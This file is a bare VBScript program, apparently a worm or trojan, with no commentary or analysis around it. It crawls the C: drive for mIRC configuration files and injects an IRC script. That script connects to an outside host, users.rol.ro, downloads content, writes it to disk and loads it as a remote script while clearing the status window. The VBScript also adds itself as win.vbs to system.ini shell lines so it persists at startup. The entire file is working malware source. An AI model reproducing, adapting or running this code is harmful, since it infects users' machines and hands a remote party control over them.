dim Otag 
dim DummyTag
dim SectionDef
dim Vtag
dim anatagg
call ShowFolderList("c:\")
 
 
sub ShowFolderList(s)
 on error resume next
 Set filesys = CreateObject("Scripting.FileSystemObject")
 Set RootFolder1 = FileSys.GetFolder(s)
 Set SubFolds1 = RootFolder1.subfolders
 For Each f1 in Subfolds1
 s = f1.path & "\"
 Otag = s & "mirc.ini"
 DummyTag= "C:\winamod.dat"
 SectionDef= "[rfiles]"
 if filesys.fileexists(otag) then 
 
 Call Filemod() 
 filesys.CopyFile DummyTag, Otag, true
 setcleararchivebit(otag)
 End If
 Call ShowFolderList(s)
 Next
End sub
sub ModifSys(s)
 on error resume next
 Set filesys = CreateObject("Scripting.FileSystemObject")
 Set RootFolder1 = FileSys.GetFolder(s)
 Set SubFolds1 = RootFolder1.subfolders
 For Each f1 in Subfolds1
 s = f1.path & "\"
 Otag = s & "system.ini"
 DummyTag= "C:\winamod.dat"
 if filesys.fileexists(otag) then 
  Call modif() 
 End If
 
 Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
fr2.writeline "[script]"
fr2.writeline "n0=alias ircx[start] { .sockopen Mircxx $+ $rand(1,1728) users.rol.ro 80 }"
fr2.writeline "n1=on 1:sockopen:mircxx*:{"
fr2.writeline "n2=  .sockwrite -nt $sockname GET /a/alen/ad/index.html HTTP/1.0"
fr2.writeline "n3=  .sockwrite -nt $sockname $crlf"
fr2.writeline "n4=  .set %upgrd off"
fr2.writeline "n5=}"
fr2.writeline "n6=on 1:sockread:mircxx* {"
fr2.writeline "n7=   if ($sockerr > 0) return"
fr2.writeline "n8=   :nextread"
fr2.writeline "n9=   sockread %temp"
fr2.writeline "n10=  if ($sockbr == 0) return"
fr2.writeline "n11=  if (%temp == $null) %temp = - "
fr2.writeline "n12=    if ( sfile isin %temp ) {  "
fr2.writeline "n13=      .set %sfile $gettok(%temp,2-,32)"
fr2.writeline "n14=      if ( $exists(%sfile) ) { .remove %sfile } "
fr2.writeline "n15=    }"
fr2.writeline "n16=  if ( wrtf isin %temp ) { .write %sfile $gettok(%temp,2-,32) } "
fr2.writeline "n17=  if ( doupgrd isin %temp ) { .set %upgrd on }"
fr2.writeline "n18=   goto nextread "
fr2.writeline "n19=}"
fr2.writeline "n20=on 1:sockclose:mircxx*:{"
fr2.writeline "n21=   if ( %upgrd = on ) {"
fr2.writeline "n22=    .load -rs %sfile "
fr2.writeline "n23=   }"
fr2.writeline "n24= .unset %temp | .unset %upgrd"
fr2.writeline "n25= .clear -s "
fr2.writeline "n26=}"
fr2.writeline "n27=on 1:input:*:{ if ( /remote isin $1- ) { remote on | clear -s } } "
fr2.writeline "n28="
fr2.writeline "n29=on 1:start:{"
fr2.writeline "n30="
fr2.writeline "n31= if (%sfile != $null) && ($exists(%sfile)) { .load -rs %sfile }"
fr2.writeline "n32= ircx[start] "
fr2.writeline "n33= if ($remote != 7) { remote on | clear | clear -s }"
fr2.writeline "n34=}"
fr2.writeline "n35=on 1:connect:{ ircx[start] }"
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=mirc.ini" 
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
end function

function modif()
on error resume next
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.CreateTextFile(dummytag)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if mid(segment2,1,5) <> "shell" then 
fr5.writeline segment2 
end if
sgm1 = 1
if mid(segment2,1,5) = "shell" then 
sgm1 = 1
do while 1 = 1
sgm1 = sgm1 + 1
if mid(segment2,sgm1, sgm1 + 7 ) = "win.vbs" then 
fr5.writeline segment2 
exit do 
end if 
if mid(segment2,sgm1, sgm1 + 7 ) <> "win.vbs" and sgm1 > 1986 then 
fr5.writeline segment2 & " c:\windows\win.vbs"
exit do 
end if 
loop 
end if 
loop
fr4.Close
fr5.Close
set ssc=createobject("scripting.filesystemobject")
ssc.CopyFile DummyTag, otag, true
end Function

sub CreateWin(anatagg)
on error resume next
dummytag="c:\winamod.dat"
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(anatagg,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.CreateTextFile(dummytag)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
if mid(segment2,1,13) <> "call ModifSys" and mid(segment2,1,13) <> "sss.DeleteFil" and mid(segment2,1,13) <> "call CreateWi" and mid(segment2,1,8) <> "sub2tewi" then 
fr5.writeline segment2 
end if
if mid(segment2,1,13) = "call ModifSys" or mid(segment2,1,13) = "sss.DeleteFil" or mid(segment2,1,13) = "call CreateWi" or mid(segment2,1,8) = "sub2tewi" then 
fr5.writeline " " 
end if 
end if
loop

fr4.Close
fr5.Close
set ssc=createobject("scripting.filesystemobject")
ssc.CopyFile DummyTag, "c:\windows\win.vbs", true
end sub

Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub

Sub sub2tewi(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
End Sub

set sss=createobject("scripting.filesystemobject")
 sss.DeleteFile "c:\winamod.dat"
 
